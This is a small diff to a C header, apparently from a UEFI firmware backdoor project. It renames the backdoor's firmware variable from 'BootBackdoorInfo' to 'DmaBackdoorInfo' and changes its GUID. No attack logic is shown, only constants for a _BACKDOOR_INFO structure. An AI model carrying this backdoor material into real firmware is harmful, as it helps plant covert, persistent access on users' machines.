@@ -66,10 +66,10 @@ typedef struct _BACKDOOR_INFO
     Firmware variable to store debug messages buffer address
 */
 
-#define BACKDOOR_VAR_NAME L"BootBackdoorInfo"
+#define BACKDOOR_VAR_NAME L"DmaBackdoorInfo"
 
-#define BACKDOOR_VAR_GUID { 0xc099b5a7, 0x7eb1, 0x422a, \
-                          { 0x89, 0xd2, 0x9e, 0x64, 0x98, 0xb2, 0x7b, 0xcf }}
+#define BACKDOOR_VAR_GUID { 0x4c52678d, 0x4851, 0x4501, \
+                          { 0x9a, 0x14, 0x29, 0xa9, 0xae, 0x18, 0xf0, 0x57 }}
 
 
 // debug messages buffer size 
